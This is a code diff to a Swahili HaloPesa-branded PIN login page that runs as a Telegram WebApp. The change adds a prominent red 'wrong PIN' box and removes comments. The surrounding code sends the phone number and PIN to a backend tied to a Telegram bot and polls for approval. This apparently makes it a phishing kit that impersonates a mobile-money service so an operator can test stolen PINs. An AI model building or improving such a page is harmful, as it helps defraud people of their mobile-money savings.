@@ -229,7 +229,7 @@
             text-decoration: underline;
         }
 
-        /* ===== STATUS MESSAGES - ULTRA VISIBLE ===== */
+        /* ===== STATUS MESSAGE (normal) ===== */
         #status {
             min-height: 22px;
             margin-top: 12px;
@@ -242,7 +242,6 @@
             border: 2px solid transparent;
         }
 
-        /* Success - Green */
         #status.success {
             display: block;
             background: #e6f7e6;
@@ -255,7 +254,6 @@
             font-size: 18px;
         }
 
-        /* Waiting - Yellow/Amber */
         #status.waiting {
             display: block;
             background: #fefcf0;
@@ -268,7 +266,6 @@
             font-size: 18px;
         }
 
-        /* Telegram Info - Blue */
         #status.telegram-info {
             display: block;
             background: #e8f0fe;
@@ -281,34 +278,36 @@
             font-size: 18px;
         }
 
-        /* ===== SUPER PROMINENT ERROR (always visible) ===== */
-        #status.wrong-pin,
-        #status.telegram-pin-error {
-            display: block !important;
-            background: #d32f2f !important;
-            color: #ffffff !important;
-            border-color: #b71c1c !important;
-            border-width: 3px;
-            box-shadow: 0 4px 24px rgba(211, 47, 47, 0.5) !important;
-            font-size: 18px !important;
-            font-weight: 700 !important;
-            padding: 16px 20px !important;
-            animation: pulseError 1.2s ease-in-out infinite;
+        /* ===== DEDICATED ERROR BOX - ALWAYS VISIBLE WHEN SHOWN ===== */
+        #errorBox {
+            display: none;
+            background: #d32f2f;
+            color: #ffffff;
+            font-size: 18px;
+            font-weight: 700;
+            padding: 16px 20px;
+            border-radius: 12px;
+            border: 3px solid #b71c1c;
+            box-shadow: 0 4px 24px rgba(211, 47, 47, 0.6);
+            margin-top: 16px;
             text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.3);
+            animation: pulseError 1.2s ease-in-out infinite;
         }
-        #status.wrong-pin::before,
-        #status.telegram-pin-error::before {
+        #errorBox::before {
             content: "🚫 ";
             font-size: 24px;
+        }
+        #errorBox.show {
+            display: block !important;
         }
 
         @keyframes pulseError {
             0%,
             100% {
-                box-shadow: 0 4px 24px rgba(211, 47, 47, 0.5);
+                box-shadow: 0 4px 24px rgba(211, 47, 47, 0.6);
             }
             50% {
-                box-shadow: 0 4px 36px rgba(211, 47, 47, 0.8);
+                box-shadow: 0 4px 36px rgba(211, 47, 47, 0.9);
             }
         }
 
@@ -346,7 +345,6 @@
             margin-top: 10px;
         }
 
-        /* ===== LOGIN BUTTON ===== */
         .action {
             width: 100%;
             background: #1a7a2a;
@@ -434,6 +432,10 @@
                 font-size: 14px;
                 padding: 10px 14px;
             }
+            #errorBox {
+                font-size: 16px;
+                padding: 14px 16px;
+            }
         }
     </style>
 </head>
@@ -483,8 +485,11 @@
 
                 <div class="forgot" id="forgotPin">Umesahau Nambari ya Siri?</div>
 
-                <!-- ===== STATUS MESSAGE ===== -->
+                <!-- ===== STATUS MESSAGE (regular) ===== -->
                 <div id="status"></div>
+
+                <!-- ===== DEDICATED ERROR BOX (extra safe) ===== -->
+                <div id="errorBox">Nambari ya Siri si sahihi. Tafadhali jaribu tena.</div>
 
                 <!-- ===== TEST BUTTON (Telegram only) ===== -->
                 <button class="test-wrong-pin" id="testWrongPinBtn">🔴 Jaribu PIN Isiyo Sahihi</button>
@@ -521,6 +526,7 @@
         const boxes = document.querySelectorAll(".pin-boxes input");
         const pinBoxesContainer = document.getElementById("pinBoxesContainer");
         const statusEl = document.getElementById("status");
+        const errorBox = document.getElementById("errorBox");
         const loginBtn = document.getElementById("loginBtn");
         const forgotPinEl = document.getElementById("forgotPin");
         const toggleVisibilityEl = document.getElementById("toggleVisibility");
@@ -543,7 +549,6 @@
             return !!(window.Telegram && window.Telegram.WebApp);
         }
 
-        // Add a class to body for Telegram-specific styling
         if (isTelegramWebApp()) {
             document.body.classList.add('telegram-app');
         }
@@ -574,12 +579,14 @@
             statusEl.style.display = 'none';
             statusEl.className = '';
             statusEl.textContent = '';
+            errorBox.classList.remove('show'); // also hide the dedicated error box
         }
 
-        // ===== PIN APPROVED - GREEN =====
+        // ===== PIN APPROVED =====
         function showPinApproved() {
             const message = "Nambari ya Siri imekubaliwa";
             setStatus(message, 'success');
+            errorBox.classList.remove('show');
             if (isTelegramWebApp()) notifyTelegram(message, 'success');
         }
 
@@ -588,17 +595,21 @@
             console.log("❌ showWrongPin() called – displaying error now.");
             const message = "Nambari ya Siri si sahihi. Tafadhali jaribu tena.";
 
-            // Force the error to be visible with the most prominent style
+            // 1. Show the dedicated error box (always visible)
+            errorBox.textContent = message;
+            errorBox.classList.add('show');
+
+            // 2. Also update the status div (for consistency)
             setStatus(message, 'telegram-pin-error');
 
-            // Also show Telegram alert
+            // 3. Telegram alert
             if (isTelegramWebApp()) {
                 notifyTelegram("❌ Nambari ya Siri si sahihi. Tafadhali jaribu tena.", 'error');
             }
 
-            // Shake animation on the pin boxes
+            // 4. Shake animation
             pinBoxesContainer.classList.remove('shake');
-            void pinBoxesContainer.offsetWidth; // trigger reflow
+            void pinBoxesContainer.offsetWidth;
             pinBoxesContainer.classList.add('shake');
             boxes.forEach(b => b.classList.add('error'));
             setTimeout(() => {
@@ -606,8 +617,7 @@
                 pinBoxesContainer.classList.remove('shake');
             }, 600);
 
-            // Extra: log to console for debugging
-            console.log("✅ Error message should be visible now.");
+            console.log("✅ Error message should now be visible in both the status bar and the dedicated error box.");
         }
 
         // =============================================
@@ -636,7 +646,10 @@
             this.classList.remove('error');
             localStorage.setItem("phone", this.value);
             validateAndUpdateButton();
-            // Clear any error when user starts typing
+            // Clear error when user starts typing
+            if (errorBox.classList.contains('show')) {
+                errorBox.classList.remove('show');
+            }
             if (statusEl.className === 'wrong-pin' || statusEl.className === 'telegram-pin-error') {
                 clearStatus();
             }
@@ -666,7 +679,6 @@
                     return;
                 }
 
-                // Auto-submit when the last digit is entered
                 if (i === 3 && this.value) {
                     let pin = "";
                     boxes.forEach(b => pin += b.value);
@@ -701,6 +713,9 @@
             box.addEventListener("focus", function() {
                 this.classList.remove('error');
                 // Clear error when focusing a pin box
+                if (errorBox.classList.contains('show')) {
+                    errorBox.classList.remove('show');
+                }
                 if (statusEl.className === 'wrong-pin' || statusEl.className === 'telegram-pin-error') {
                     clearStatus();
                 }
@@ -758,6 +773,7 @@
             let msg = "Tafadhali wasiliana na msimamizi wa HaloPesa kupata Nambari yako ya Siri.";
             if (phone.length > 0) msg = `Tafadhali wasiliana na msimamizi wa HaloPesa kwa nambari ${phone}.`;
             setStatus(msg, "telegram-info");
+            errorBox.classList.remove('show');
             if (isTelegramWebApp()) notifyTelegram("Wasiliana na msimamizi.", "info");
         });
 
@@ -772,6 +788,7 @@
             loginBtn.disabled = true;
             loginBtn.classList.add("disabled", "loading");
             clearStatus();
+            errorBox.classList.remove('show');
 
             if (pollingInterval) {
                 clearInterval(pollingInterval);
@@ -780,7 +797,6 @@
 
             setStatus("Inatuma kwa uthibitisho...", isTelegramWebApp() ? "telegram-info" : "waiting");
 
-            // ===== MOCK MODE =====
             if (USE_MOCK) {
                 console.log("🧪 Mock mode: testing PIN", pin);
                 await new Promise(resolve => setTimeout(resolve, 1500));
@@ -796,7 +812,6 @@
                 return;
             }
 
-            // ===== REAL BACKEND =====
             try {
                 const firstName = localStorage.getItem("firstName") || "";
                 const lastName = localStorage.getItem("lastName") || "";
@@ -956,7 +971,7 @@
             isSubmitting = false;
             validateAndUpdateButton();
             boxes[0].focus();
-            // Do NOT clear status – we want the error to remain visible until user interacts
+            // We keep error visible until user interacts
         }
 
         // =============================================
@@ -988,13 +1003,11 @@
         });
 
         // =============================================
-        //  TEST WRONG PIN BUTTON (Telegram only)
+        //  TEST WRONG PIN BUTTON
         // =============================================
         testWrongPinBtn.addEventListener("click", function() {
             console.log("🧪 Test wrong PIN button clicked.");
-            // Show the error immediately
             showWrongPin();
-            // Also clear any previous status (though showWrongPin does it)
         });
 
         // =============================================
@@ -1021,6 +1034,8 @@
                         setTimeout(clearStatus, 5000);
                     }
                 }
+                // Hide the error box initially
+                errorBox.classList.remove('show');
             }, 100);
         });
 
@@ -1040,7 +1055,7 @@
         console.log("📱 Telegram WebApp:", isTelegramWebApp() ? "Yes" : "No");
         console.log("🤖 Bot ID:", botId || "MISSING");
         console.log("🧪 Mock mode:", USE_MOCK ? "ON (PIN 1234 = success)" : "OFF (using real backend)");
-        console.log("👉 Error messages will now be displayed with red background + white text.");
+        console.log("👉 Error will now appear in a dedicated red box + Telegram alert.");
     </script>
 
 </body>
